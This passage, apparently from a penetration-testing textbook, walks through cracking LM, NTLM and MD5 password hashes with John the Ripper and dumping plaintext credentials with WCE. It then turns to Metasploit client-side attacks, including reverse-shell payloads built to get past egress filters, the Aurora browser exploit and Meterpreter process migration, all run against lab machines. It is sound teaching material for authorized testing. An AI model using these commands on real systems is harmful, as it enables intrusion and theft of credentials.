N ote In Chapter 13, we‚Äôll explore some tricks for using password hashes to authenticate
without the need for access to the plaintext passwords, but usually, in order to use 
these hashes, we‚Äôll need to reverse the cryptographic hash algorithms and get the plaintext passwords. The difficulty of this depends on the password-hashing algorithm used 
as well as the strength of the password used. 
LM vs. NTLM Hashing Algorithms
Listing 9-14 compares the two password hash entries. The first one belongs 
to the Administrator account on Windows XP, which we found with hashdump in 
Meterpreter, and the second is Georgia Weidman‚Äôs account from Windows 7, 
which we found with physical access in the previous section. 
Administratoru:500v:e52cac67419a9a224a3b108f3fa6cb6dw:8846f7eaee8fb117ad06bdd830b7586cx
Georgia Weidmanu:1000v:aad3b435b51404eeaad3b435b51404eew:8846f7eaee8fb117ad06bdd830b7586cx
Listing 9-14: Dumping Windows hashes with a Linux Live CD
The first field in the hashes is the username u; the second is the user 
ID v; the third is the password hash in LAN Manager (LM) format w; and 
the fourth is the NT LAN Manager (NTLM) hash x. LM Hash was the primary way to hash passwords on Microsoft Windows up to Windows NT, but 
it‚Äôs a cryptographically unsound method that makes it possible to discover 
the correct plaintext password for an LM hash, regardless of a password‚Äôs 
length and complexity. Microsoft introduced NTLM hashing to replace LM 
hash, but on Windows XP, passwords are stored in both LM and NTLM formats by default. (Windows 7 opts exclusively for the more secure NTLM hash.) 
In the hashes in Listing 9-14, because both passwords are the 
string password, the NTLM hash entries for each account are identical, but the LM hash fields are different. The first entry has the value 
e52cac67419a9a224a3b108f3fa6cb6d, whereas the Windows 7 entry has 
aad3b435b51404eeaad3b435b51404ee, which is LM hash-speak for empty. The 
inclusion of the LM hash entry will make cracking the hashes much simpler. In fact, any LM-hashed password can be brute-forced in minutes to 
hours. In contrast, our ability to crack the NTLM hashes will depend on 
both our ability to guess and the length and complexity of the password. 
If the hashing function is cryptographically sound, it could take years, 
decades, or more than your lifetime to try every possible password. 
Password Attacks 209
The Trouble with LM Password Hashes
When you see LM hashes on a pentest, you can be sure that the plaintext 
password is recoverable from the password hash. However, one-way hash 
functions can‚Äôt be reversed. Complex math is used to develop algorithms that 
make it impossible to discover the original plaintext password value that was 
hashed, given the password hash. But we can run a plaintext password guess 
through the cryptographic hashing function and compare the results to 
the hash we‚Äôre trying to crack; if they‚Äôre the same, we‚Äôve found the correct 
password.
The following issues contribute to the insecurity of LM hashes: 
‚Ä¢	 Passwords are truncated at 14 characters.
‚Ä¢	 Passwords are converted to all uppercase. 
‚Ä¢	 Passwords of fewer than 14 characters are null-padded to 14 characters. 
‚Ä¢	 The 14-character password is broken into two seven-character passwords 
that are hashed separately.
Why are these characteristics so significant? Say we start with a complex, strong password like this: 
T3LF23!+?sRty$J
This password has 15 characters from four classes, including lowercase 
letters, uppercase letters, numbers, and symbols, and it‚Äôs not based on a 
dictionary word. However, in the LM hash algorithm, the password is truncated to 14 characters like this: 
T3LF23!+?sRty$
Then the lowercase letters are changed to uppercase: 
T3LF23!+?SRTY$
Next, the password is split into two seven-character parts. The two parts 
are then used as keys to encrypt the static string KGS!@#$% using the Data 
Encryption Standard (DES) encryption algorithm:
T3LF23! +?SRTY$
The resulting eight-character ciphertexts from the encryption are then 
concatenated to make the LM hash. 
To crack an LM hash, we just need to find seven characters, all uppercase, with perhaps some numbers and symbols. Modern computing hardware 
can try every possible one- to seven-character combination, encrypt the string 
KGS!@#$%, and compare the resulting hash to a given value in a matter of minutes to hours. 
210 Chapter 9
John the Ripper
One of the more popular tools for cracking passwords is John the Ripper. 
The default mode for John the Ripper is brute forcing. Because the set of possible plaintext passwords in LM hash is so limited, brute forcing is a viable 
method for cracking any LM hash in a reasonable amount of time, even with 
our Kali virtual machine, which has limited CPU power and memory. 
For example, if we save the Windows XP hashes we gathered earlier 
in this chapter to a file called xphashes.txt, then feed them to John the 
Ripper like this, we find that John the Ripper can run through the entire 
set of possible passwords and come up with the correct answer, as shown in 
Listing 9-15. 
root@kali: john xphashes.txt
Warning: detected hash type "lm", but the string is also recognized as "nt" 
Use the "--format=nt" option to force loading these as that type instead
Loaded 10 password hashes with no different salts (LM DES [128/128 BS SSE2])
 (SUPPORT_388945a0)
PASSWOR (secret:1)
 (Guest)
PASSWOR (georgia:1)
PASSWOR (Administrator:1)
D (georgia:2)
D (Administrator:2)
D123 (secret:2)
Listing 9-15: Cracking LM hashes with John the Ripper
John the Ripper cracks the seven-character password hashes. In 
Listing 9-15, we see that PASSWOR is the first half of the user secret‚Äôs password. Likewise, it‚Äôs the first half of the password for georgia and Administrator. 
The second half of secret‚Äôs password is D123, and georgia and Administrator‚Äôs 
are D. Thus, the complete plaintext of the LM-hashed passwords are 
PASSWORD for georgia and Administrator and PASSWORD123 for secret. The 
LM hash doesn‚Äôt tell us the correct case for a password, and if you try logging in to the Windows XP machine as Administrator or georgia with the 
password PASSWORD or the account secret with PASSWORD123, you will 
get a login error because LM hash does not take into account the correct 
case of the letters in the password. 
To find out the correct case of the password, we need to look at the 
fourth field of the NTLM hash. John the Ripper noted in the example in 
Listing 9-15 that NTLM hashes were also present, and you can use the flag 
--format=nt to force John the Ripper to use those hashes (we don‚Äôt have LM 
hashes for Windows 7, so we will have to crack Windows 7 passwords with a 
wordlist since brute forcing the NTLM hashes would likely take too long). 
Cracking Windows NTLM hashes is nowhere near as easy as cracking 
LM ones. Although a five-character NTLM password that uses only lowercase letters and no other complexity could be brute-forced as quickly as 
an LM hash, a 30-character NTLM password with lots of complexity could 
Password Attacks 211
take many years to crack. Trying every possible character combination of 
any length, hashing it, and comparing it to a value could go on forever until 
we happened to stumble upon the correct value (only to find out that the 
user has since changed his or her password).
Instead of attempting to brute-force passwords, we can use wordlists 
containing known passwords, common passwords, dictionary words, combinations of dictionary words padded with numbers and symbols at the end, 
and so on. (We‚Äôll see an example of using a wordlist with John the Ripper 
in ‚ÄúCracking Linux Passwords‚Äù on page 212). 
A Real-World Ex 
Legacy password hashing once made all the difference on one of my pentests
The domain controller was Windows Server 2008, with a strong security posture. The workstations throughout the enterprise were reasonably secure, too,
having recently been upgraded to fully patched Windows 7 systems. There
was, however, one promising light in the dark: a Windows 2000 box that was 
missing several security patches. I was able to quickly gain system privileges on
the machine using Metasploit
The trouble was that, while on paper, the penetration test was now a success, compromising the machine had gained me next to nothing. The system
contained no sensitive files, and it was the only machine on this particular network, isolated from the new, updated Windows domain. It had all the trappings
of a domain controller, except it had no clients. All of the other machines in
the environment were members of the new Windows 2008 domain controller‚Äôs 
domain. Though technically I was now a domain administrator, I was no further
along on the pentest than I was before I found the Windows 2000 machine
Since this was the domain controller, the domain user password hashes 
were included locally. Windows 2000, like Windows XP, stored the LM hashes
of passwords. The client‚Äôs old domain administrator password was strong; it
had about 14 characters; included uppercase letters, lowercase letters, numbers, 
and symbols; and was not based on a dictionary word. Fortunately, because it
was LM hashed, I was able to get the password back in a matter of minutes
What do you think the domain administrator‚Äôs password was on the 
new domain? You guessed it. It was the same as the domain administrator‚Äôs
password on the old domain. The Windows 2000 box had not been used in
over six months, but it was still running, and it used an insecure hashing algorithm. Also, the client wasn‚Äôt changing their passwords regularly. These tw
things combined to bring down what was otherwise a strong security posture. I
was able to access every system in the environment just by logging in with the 
domain administrator password I found on the compromised Windows 2000 
system
212 Chapter 9
Cracking Linux Passwords
We can also use John the Ripper against the Linux password hashes we 
dumped after exploiting the Vsftpd server backdoor in Chapter 8, as shown 
in Listing 9-16. 
root@kali# cat linuxpasswords.txt
georgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::
root@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt
Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])
password (georgia)
guesses: 1 time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015) c/s: 100 
trying: password - Password123
Listing 9-16: Cracking Linux hashes with John the Ripper 
User georgia has an MD5 hash (we can tell from the $1$ at the beginning 
of the password hash). MD5 can‚Äôt be brute-forced in a reasonable amount of 
time. Instead, we use a wordlist with the --wordlist option in John the Ripper. 
John the Ripper‚Äôs success at cracking the password depends on the inclusion of the correct password in our wordlist. 
Cracking Configuration File Passwords
Finally, let‚Äôs try to crack the MD5 hashed passwords we found in the 
FileZilla FTP server configuration file we downloaded with the Zervit 0.4 
file inclusion vulnerability. As you‚Äôll see, sometimes we don‚Äôt even need to 
crack a password hash. For example, try entering the hash for the user 
georgia, 5f4dcc3b5aa765d61d8327deb882cf99, into a search engine. The first 
few hits confirm that georgia‚Äôs password is password. Additionally, searching 
tells us that the account newuser is created when a FileZilla FTP server is 
installed with the password wampp. 
Mangling Wordlists with John th
When required by a password policy to include a number and/or a symbol in 
a password, many users will just tack them on to the end of a dictionary word
Using John the Ripper‚Äôs rules functionality, we can catch this and other common 
mutations that may slip by a simple wordlist. Open the John the Ripper configuration file at /etc/john/john.conf in an editor and search for List.Rules:Wordlis
Beneath this heading, you can add mangling rules for the wordlist. For example,
the rule $[0-9]$[0-9]$[0-9] will add three numbers to the end of each word 
in the wordlist. You can enable rules in John the Ripper by using the flag
--rules at the command line. More information on writing your own rules
can be found at http://www.openwall.com/john/doc/RULES.shtml
Password Attacks 213
Now try logging in to the Windows XP target‚Äôs FTP server with these 
credentials. Sure enough, login is successful. The administrator of this 
system forgot to change the default password for the built-in FTP account. 
If we were not able to recover the plaintext passwords this easily, we could 
again use John the Ripper with a wordlist, as discussed previously. 
Rainbow Tables
Rather than taking a wordlist, hashing each entry with the relevant algorithm, and comparing the resulting hash to the value to be cracked, we 
can speed up this process considerably by having our wordlist prehashed. 
This, of course, will take storage space‚Äîmore with longer hash lists, and 
approaching infinity as we try to store every possible password hash value 
for brute forcing. 
A set of precomputed hashes is known as a rainbow table. Rainbow tables 
typically hold every possible hash entry for a given algorithm up to a certain 
length with a limited character set. For example, you may have a rainbow 
table for MD5 hashes that contains all entries that are all lowercase letters 
and numbers with lengths between one and nine. This table is about 80 GB‚Äî
not so bad with today‚Äôs price of storage, but keep in mind this is only a very 
limited amount of the possible keyspace for MD5. 
Given its limited keyspace (discussed previously), an LM hash appears 
to be an ideal candidate for using rainbow tables. A full set of LM hash 
rainbow tables is about 32 GB. 
You can download pregenerated sets of hashes from http://project
-rainbowcrack.com/table.htm. The tool Rcrack in Kali can be used to sift 
through the rainbow tables for the correct plaintext. 
Online Password-Cracking Services
The current hip thing to do in IT is to move things to the cloud, and password cracking is no different. By leveraging multiple high-spec machines, 
you can get faster, more comprehensive results than you could with just 
a virtual machine on your laptop. You can, of course, set up up your own 
high-powered machines in the cloud, create your own wordlists, and so on, 
but there are also online services that will take care of this for you for a 
fee. For example, https://www.cloudcracker.com/ can crack NTLM Windows 
hashes, SHA-512 for Linux, WPA2 handshakes for wireless, and more. You 
simply upload your password hash file, and the cracker does the rest. 
Dumping Plaintext Passwords from Memory wit
Windows Credential Edit
Why bother cracking password hashes if we can get access to plaintext 
passwords? If we have access to a Windows system, in some cases we can pull 
plaintext passwords directly from memory. One tool with this functionality 
is the Windows Credential Editor (WCE). We can upload this tool to an 
exploited target system, and it will pull plaintext passwords from the Local 
214 Chapter 9
Security Authority Subsystem Service (LSASS) process in charge of enforcing 
the system‚Äôs security policy. You can download the latest version of WCE from 
http://www.ampliasecurity.com/research/wcefaq.html. An example of running 
WCE is shown in Listing 9-17.
C:\>wce.exe -w
wce.exe -w
WCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa 
(hernan@ampliasecurity.com)
Use -h for help.
georgia\BOOKXP:password
Listing 9-17: Running WCE
Here WCE found the plaintext of the user georgia‚Äôs password. The 
downside to this attack is that it requires a logged-in user for the password 
to be stored in memory. Even if you were able to get a plaintext password or 
two with this method, it is still worth dumping and attempting to crack any 
password hashes you can access. 
Summar
Reversing password hashes is an exciting field, and as the speed of hardware increases, it becomes possible to crack stronger hashes faster. Using 
multiple CPUs and even the graphics processing units (GPUs) on video 
cards, password crackers can try many hashes very quickly. Our virtual 
machines don‚Äôt have much processing power, but even your average modern 
laptop is much faster than the machines that were used for password cracking just a few short years ago. The cutting edge of password cracking these 
days is taking to the cloud and harnessing multiple top-spec cloud servers 
for cracking. You‚Äôll even find some cloud-based password-cracking services. 
As you‚Äôve seen in this chapter, using information gathered from successful exploits in Chapter 8, we‚Äôve managed to reverse password hashes 
to recover plaintext passwords for some services and the systems themselves. 
Having managed to get a foothold on the systems, let‚Äôs look at some advanced 
attack methods that can help us if we can‚Äôt find anything vulnerable when 
listening on the network. We still have the Windows 7 machine to exploit, 
after all.
10
Client-Sid  E x ploita
The vulnerabilities we‚Äôve studied so far have been 
low-hanging fruit, and all have come up on real 
engagements. It‚Äôs common on penetration tests to 
find vulnerable services listening on ports, unchanged 
default passwords, misconfigured web servers, and 
so on. 
However, clients who put a lot of time and effort into their security posture may be free from these kinds of vulnerabilities. They may have all security patches in place; they may periodically audit passwords and remove any 
that can be easily guessed or cracked. They may control user roles: Regular 
users may not have administrative rights on their workstations, and any software that is installed is investigated and maintained by the security staff. As 
a result, there may not be many services to even try to attack. 
Yet, despite the deployment of the latest and greatest security technologies and the employment of crack security teams, high-profile companies 
(with potentially high payoffs for attackers) are still being breached. In this 
216 Chapter 10
chapter we‚Äôll examine a few different kinds of attacks that don‚Äôt require 
direct network access. We‚Äôll study attacks that target local software on a 
system‚Äîsoftware that is not listening on a port. 
Because we won‚Äôt attack a computer or listening port directly, and 
because we need to come up with another way to attack a device inside a 
corporate perimeter, we need to select our payload accordingly. Whereas 
a normal bind shell might work fine for systems directly exposed to the 
Internet or listening on a port on our local network, we will at the very least 
be limited to reverse connections here. 
But first let‚Äôs dive a little deeper into the Metasploit payload system and 
check out some other payloads that may be useful to you.
Bypassing Filters with Metasploit Payloads
In previous chapters we discussed the Metasploit payload system, including 
single versus staged payloads and bind shells versus reverse shells. We also 
talked briefly about Metasploit‚Äôs Meterpreter payload (which we‚Äôll discuss in 
depth in Chapter 13). When you use the command show payloads on a module, you may see several payloads that may be new to you. We‚Äôll look at a 
few in this section that can be used to bypass filtering technologies you may 
encounter on your pentests.
All Ports
Our network is set up such that our attack and target virtual machines are 
on the same network with no firewalls or other filters blocking communications. However, in your pentesting career, you may encounter clients with 
all sorts of filtering setups. Even a reverse connection may not be able to 
get through the filters and connect back to your attack machine on just 
any port. For example, a client network may not allow traffic to leave the 
network on port 4444, the default for Metasploit reverse_tcp payloads. It may 
allow traffic out only on specific ports, such as 80 or 443 for web traffic. 
If we know which ports are allowed through the filter, we can set the 
LPORT option to the relevant port. The Metasploit reverse_tcp_allports payloads 
can help us find a port to connect to. As the name suggests, this payload 
communication method will try all ports until it finds a successful connection back to Metasploit. 
Let‚Äôs test this functionality with the windows/shell/reverse_tcp_allports payload, as shown in Listing 10-1. We are using the MS08-067 exploit against 
Windows XP.
msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp_allports
payload => windows/shell/reverse_tcp_allports
msf exploit(ms08_067_netapi) > show options
--snip--
Payload options (windows/shell/reverse_tcp_allports):
Client-Side Exploitation 217
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 EXITFUNC thread yes Exit technique: seh, thread, process, none
 LHOST 192.168.20.9 yes The listen address
 uLPORT 1 yes The starting port number to connect back on
--snip--
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:1 
--snip--
[*] Sending encoded stage (267 bytes) to 192.168.20.10
[*] Command shell session 5 opened (192.168.20.9:1 -> 192.168.20.10:1100) at 2015-05-14 
22:13:20 -0400 v
Listing 10-1: Windows/shell/reverse_tcp_allports payload
Here, the LPORT u option specifies the first port to try. If that port doesn‚Äôt 
work, the payload will try each subsequent port until the connection succeeds. If the payload reaches 65535 without success, it starts trying again at 
port 1 and runs infinitely. 
Because there is no filter blocking our traffic, the first port Metasploit 
tries, port 1, creates a successful connection, as shown at v. Though this 
payload will work in many cases, some filtering technologies will be able 
to stop it regardless of the port it tries to connect to. One downside to this 
payload is that it may run for a long time in an attempt to find an unfiltered 
port. If a user sees the application hanging, he or she may close it before 
the payload is successful. 
HTTP and HTTPS Payloads 
While some filters may allow all traffic out on certain ports, the most 
advanced filtering systems use content inspection to screen for legitimate 
protocol-specific traffic. This can pose a problem for our payloads. Even 
though our Meterpreter payload communication is encrypted‚Äîthe content 
inspection won‚Äôt be able to say, ‚ÄúThat‚Äôs Metasploit, go away!‚Äù‚Äîthe filter will 
be able to tell that the traffic going out on port 80 doesn‚Äôt meet the HTTP 
specification. 
To address this challenge, the developers of Metasploit created HTTP 
and HTTPS payloads. These payloads follow the HTTP and HTTPS specifications so that even content-inspection filters will be convinced that our 
traffic is legitimate. Also, these payloads are packet based, rather than 
stream based like the TCP payloads. That means they aren‚Äôt limited to a 
specific connection. If you lose network communication briefly and lose all 
your Metasploit sessions, HTTP and HTTPS sessions can recover and reconnect. (We‚Äôll see an example using these payloads in ‚ÄúJava Vulnerability‚Äù on 
page 230.)
218 Chapter 10
Though HTTP and HTTPS payloads will get you through most filtering technologies, you may find yourself in an even more complex filtering 
situation. For example, I tested one client where only the Internet Explorer 
process, when started by a domain-authenticated user, could reach the 
Internet. Employees could browse the Internet to perform their business, 
but they were somewhat limited. For instance, they couldn‚Äôt use an instant 
messenger client. While this probably annoyed some employees, it was a 
good idea for security reasons. Even if we had been able to successfully 
exploit something, even HTTP and HTTPS payloads could not get out to 
the Internet. (In ‚ÄúBrowser Exploitation‚Äù on page 219, we‚Äôll look at some 
attack methods that would allow us to exploit the Internet Explorer process 
when a legitimate domain user is logged in and then connect to the outside 
world.)
Meterpreter HTTP and Meterpreter HTTPS use the proxy settings 
of Internet Explorer to navigate any proxies necessary to call out to the 
Internet. For this reason, if your target process is running as the System
user, these proxy settings may not be defined, and these payloads may fail.
N ote There is also a Meterpreter payload, reverse_https_proxy, that allows the attacker
to manually add in any necessary proxy settings. 
Client-Side Attack
Now let‚Äôs turn our attention to running client-side attacks. Instead of directly 
attacking a service listening on a port, we‚Äôll create a variety of malicious 
files that, when opened in vulnerable software on the target machine, will 
result in a compromise.
So far all of our attacks have involved some sort of service listening on 
a port, be it a web server, FTP server, SMB server, or otherwise. When we 
began our pentest, one of the first things we did was port scan our targets 
to see which services were listening. When we start a pentest, the potential 
vulnerabilities are practically limitless. 
As we begin running tools, performing manual analysis, and researching, the exploitation possibilities gradually decrease until we‚Äôre left with 
a limited number of issues on the target systems. Those issues have been 
server-side issues‚Äîservices listening on ports. What we are missing is any 
potentially vulnerable software that is not listening on a port‚Äîclient-side 
software. 
Software like web browsers, document viewers, music players, and so on 
are subject to the same sort of issues as web servers, mail servers, and every 
other network-based program. 
Client-Side Exploitation 219
Of course, because client-side software isn‚Äôt listening on the network, 
we can‚Äôt directly attack it, but the general principle is the same. If we can 
send unexpected input to a program to trigger a vulnerability, we can 
hijack execution, just as we exploited server-side programs in Chapter 8. 
Because we can‚Äôt send input to client-side programs directly over the network, we must entice a user to open a malicious file. 
As security is taken more seriously and server-side vulnerabilities become 
more difficult to find from an Internet-facing perspective, client-side exploitation is becoming key to gaining access to even carefully protected internal 
networks. Client-side attacks are ideal for assets such as workstations or 
mobile devices that lack an Internet-facing IP address. Though from the 
perspective of the Internet we can‚Äôt directly access those systems, they can 
typically call out to the Internet, or to a pentester-controlled system, if we 
can hijack execution. 
Unfortunately, the success of client-side attacks relies on somehow 
making sure that our exploit is downloaded and opened in a vulnerable 
product. In the next chapter, we‚Äôll look at some techniques to lure users 
into opening malicious files; for now we‚Äôll look at some client-side exploits, 
beginning with what must be the most popular target for client-side exploitation: web browsers. 
Browser Exploitation
Web browsers are made up of code to render web pages. Just as we can send 
malformed input to server software, if we open a web page with malicious 
code to trigger a security issue, we can potentially hijack execution in the 
browser and execute a payload. Though the delivery is a bit different, the fundamental concept is the same. All of the most common browsers have been 
subject to security issues‚ÄîInternet Explorer, Firefox, and even Mobile Safari. 
iPhone Jailbreaking via Browser Exploit
In the past, browser exploitation has been instrumental in iPhone jailbreaking. While later versions of iOS implement a security feature called mandator
code signing, which requires that all executed code be approved by Apple, 
Mobile Safari (the web browser on the iPhone) gets a pass because to render 
web pages, it must be able to run unsigned code. Apple can‚Äôt go through all the
pages on the Internet and sign everything that doesn‚Äôt contain malicious code
And if the iPhone can‚Äôt view web pages, everyone will just go buy an Android 
phone‚Äîthe last thing Apple wants. When iOS 4 renders PDF documents in
Mobile Safari, one of the fonts includes a security vulnerability. This client-side
attack allows jailbreakers to gain a foothold on iPhones just by tricking a user 
into opening a malicious link in the browser
220 Chapter 10
Let‚Äôs consider a famous vulnerability in Internet Explorer. The Aurora 
exploit was used in 2010 against major companies such as Google, Adobe, 
and Yahoo!. At the time of the Aurora attacks, Internet Explorer contained a 
zero-day vulnerability‚Äîthat is, a vulnerability that had not yet been patched. 
(Even a fully updated version of Internet Explorer could be compromised 
if a user could be tricked into opening a malicious web page, triggering the 
vulnerability.)
Microsoft has released patches for Internet Explorer, but as with other 
security patches, users sometimes overlook updating their browsers, and the 
version of Internet Explorer installed on the Windows XP target doesn‚Äôt have 
the necessary security patch to protect against the Aurora exploit. 
We‚Äôll use Metasploit to take control of a target machine by attacking a 
vulnerable browser using the Aurora Metasploit module, exploit/windows/
browser/ms10_002_aurora, shown in Listing 10-2. 
N ote Client-side Metasploit modules are fundamentally the same as the server-side modules we have used so far, except that the options are a bit different: Instead of sending
exploits to a remote host on the network, we set up a server and wait for a browser to 
access our page. 
msf > use exploit/windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > show options
Module options (exploit/windows/browser/ms10_002_aurora):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 uSRVHOST 0.0.0.0 yes The local host to listen on. This must be an address 
 on the local machine or 0.0.0.0
 vSRVPORT 8080 yes The local port to listen on.
 wSSL false no Negotiate SSL for incoming connections
 SSLCert no Path to a custom SSL certificate (default is randomly 
 generated)
 SSLVersion SSL3 no Specify the version of SSL that should be used 
 (accepted: SSL2, SSL3, TLS1)
 xURIPATH no The URI to use for this exploit (default is random)
Exploit target:
 Id Name
 -- ----
 y0 Automatic
Listing 10-2: Internet Explorer Aurora Metasploit module
Notice in the options for the module that instead of RHOST we see the 
SRVHOST u option. This is the local IP address for the server. By default this 
address is set to 0.0.0.0 to listen on all addresses on the local system. The 
Client-Side Exploitation 221
default port to listen on, the SRVPORT v option, is 8080. You can change this 
port number to 80 (the default port for web servers) as long as no other 
program is using the port. You can even use an SSL connection w. 
If we set the URIPATH x option, we can specify a specific URL for the 
malicious page. If we don‚Äôt set anything here, a random URL will be used. 
Because the exploitation will take place entirely inside the browser, our 
exploit will work regardless of the version of Windows running y, as long 
as Internet Explorer is subject to the Aurora vulnerability. 
Next we set the module options for our environment. The payloads 
for this module are the same as the Windows payloads we‚Äôve already seen. 
Exploiting the browser is no different from exploiting any other program 
on the system, and we can run the same shellcode. We‚Äôll use the windows/
meterpreter/reverse_tcp payload for this example to illustrate some client-side 
attack concepts, as shown in Listing 10-3. 
N ote Make sure the apache2 web server is not running on port 80 with service
apache2 stop. 
msf exploit(ms10_002_aurora) > set SRVHOST 192.168.20.9
SRVHOST => 192.168.20.9
msf exploit(ms10_002_aurora) > set SRVPORT 80
SRVPORT => 80
msf exploit(ms10_002_aurora) > set URIPATH aurora
URIPATH => aurora
msf exploit(ms10_002_aurora) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms10_002_aurora) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(ms10_002_aurora) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444 u
[*] Using URL: http://192.168.20.9:80/aurora v
[*] Server started.
Listing 10-3: Setting options and launching the Aurora module
As you can see in Listing 10-3, once we‚Äôve set the options and run the 
module, a web server is started in the background on the selected SRVPORT at 
the selected URIPATH as shown at v. Additionally, a handler is set up for the 
selected payload u. 
Now we‚Äôll use Internet Explorer on the Windows XP target to browse 
to the malicious site. In Metasploit you should see that the page has been 
served and is attempting to exploit the vulnerability, as shown in Listing 10-4. 
Although our Windows XP browser is vulnerable, it may take a couple tries 
to exploit the browser successfully. 
Exploiting the Aurora vulnerability is not as reliable as exploiting the 
other vulnerabilities we‚Äôve discussed so far in this book. If Internet Explorer 
crashes, but you do not receive a session, try browsing to the exploit page 
again. 
222 Chapter 10
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora - 
Sending Internet Explorer "Aurora" Memory Corruption
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1376) at 
2015-05-05 20:23:25 -0400 u
Listing 10-4: Receiving a client-side session 
Though this exploit may not work every time, the target browser is vulnerable and a couple of tries should do it. If the exploit succeeds, you will 
receive a session, as shown at u. We are not automatically dropped into the 
session. Use sessions -i <session id> to interact with the Meterpreter session.
Though we have successfully exploited the browser and gained a foothold on the target system, our challenges are not over. If you look back at the 
Windows XP machine and try to continue using Internet Explorer, you‚Äôll find 
that it‚Äôs no longer functioning. The exploitation involved in getting our session has made the browser unusable. The problem for us is that users who 
have been tricked into visiting our malicious site will naturally want to continue using their browsers. They may force-quit the browser, or the browser 
may crash on its own due to its unstable state. When the browser closes, we 
lose our Meterpreter session.
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 - Meterpreter session 1 closed. Reason: Diedu
Our Meterpreter payload resides entirely inside the memory of the 
exploited process. If the browser dies or is closed by the user, our session 
also dies, as you can see at u. We can lose our foothold on the system just 
as quickly as we gained it. 
We need a way to keep our Meterpreter session alive, even if the exploited 
process‚Äîin this case, the Internet Explorer browser‚Äîdies. But first, we 
need to stop our Metasploit web server so we can make some changes to the 
malicious page to fix this problem, as shown in Listing 10-5. 
msf exploit(ms10_002_aurora) > jobsu
Jobs
====
 Id Name
 -- ----
 0 Exploit: windows/browser/ms10_002_aurora
msf exploit(ms10_002_aurora) > kill 0v
Stopping job: 0...
[*] Server stopped.
Listing 10-5: Killing a background job in Metasploit 
We can see everything running in the background in Metasploit by entering jobs u. To stop a job running in the background, enter kill <job number> v.
Client-Side Exploitation 223
Because Meterpreter lives entirely inside the memory of the exploited 
process and that process is doomed to die, we need some way to move our 
session out of the Internet Explorer process and into one that is more likely 
to stick around. 
Running Scripts in a Meterpreter Session
Unlike network attacks, where we will see a session right away if our attack 
succeeds, when performing client-side attacks, we must wait until a user 
accesses our malicious page. Even if we find a way to move Meterpreter into 
another process, sessions could come in at any time. We can‚Äôt be distracted 
at any point during our pentest or we risk losing a session. It would be ideal 
if we could automatically run commands in our Meterpreter session so that 
we don‚Äôt have to sit idly, waiting for a browser to access our malicious server. 
Meterpreter scripts that can be run in an open session can be found at 
/usr/share/metasploit-framework/scripts/meterpreter in Kali. We‚Äôll look at more 
examples of Meterpreter scripts in Chapter 13, but for now let‚Äôs look at one 
specific Meterpreter script that will work well with our current scenario. The 
script migrate.rb allows us to move Meterpreter from the memory of one process to another, which is exactly what we need here. To run a Meterpreter 
script inside an active Meterpreter session, enter run <script name>, as shown 
in Listing 10-6. You may be presented with help information about how to 
use the script correctly, as we are shown here.
meterpreter > run migrate
OPTIONS:
 -f Launch a process and migrate into the new process u
 -h Help menu.
 -k Kill original process.
 -n <opt> Migrate into the first process with this executable name (explorer.exe) v
 -p <opt> PID to migrate to. w
Listing 10-6: Running a Meterpreter script 
When we attempt to run the migrate script, we see a few options. We can 
launch a new process and migrate into that process, as shown at u; migrate 
into a process with a given name v; or choose the process by process ID, as 
shown at w. 
Advanced Parameter
In addition to the module and payload options, Metasploit modules have 
advanced parameters. We can see the available advanced parameters with 
the command show advanced, as shown in Listing 10-7.
msf exploit(ms10_002_aurora) > show advanced
Module advanced options:
224 Chapter 10
 Name : ContextInformationFile
 Current Setting: 
 Description : The information file that contains context information
 --snip--
 Name : AutoRunScriptu
 Current Setting: 
 Description : A script to run automatically on session creation.
 --snip--
 Name : WORKSPACE
 Current Setting: 
 Description : Specify the workspace for this module
Listing 10-7: Metasploit advanced parameters
One of the advanced settings for our chosen payload is AutoRunScript u. 
When set, this setting will allow us to automatically run a Meterpreter script 
when a session opens. 
We can set this parameter to automatically run the migrate script when 
a Meterpreter session opens. This way, when the browser dies, as long as 
the migrate script has finished, our session will be safe from the crash. 
Additionally, by running the script automatically, we can migrate whenever 
a user accesses the malicious page, regardless of whether you have your eyes 
on Msfconsole when the session comes in, as shown in Listing 10-8. 
msf exploit(ms10_002_aurora) > set AutoRunScript migrate -fu
AutoRunScript => migrate -f
msf exploit(ms10_002_aurora) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444 
[*] Using URL: http://192.168.20.9:80/aurora
[*] Server started.
Listing 10-8: Setting the AutoRunScript parameter
To set advanced parameters, use the syntax set <parameter to set> <value>
(the same as setting regular options). For example, in Listing 10-8, we tell 
the migrate script to spawn a new process to migrate into with the -f flag u, 
and then we start the malicious server again. 
Now browse to the malicious page from the Windows XP target again 
(see Listing 10-9). 
msf exploit(ms10_002_aurora) > [*] 192.168.20.10 ms10_002_aurora - Sending Internet 
Explorer "Aurora" Memory Corruption
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1422) at 2015-05-05 20:26:15 -0400
[*] Session ID 2 (192.168.20.9:4444 -> 192.168.20.10:1422) processing AutoRunScript 'migrate -f' u
[*] Current server process: iexplore.exe (3476)
Client-Side Exploitation 225
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 484
[+] Successfully migrated to process v
Listing 10-9: Automatically migrating
This time we get a session saying that the AutoRunScript parameter is processed automatically u. The migrate script spawns a notepad.exe process and 
moves into it v. When Internet Explorer dies, our session remains alive.
Though automatically migrating is a good idea when using a browser 
exploit, it still takes a few seconds for the migration to happen‚Äîseconds 
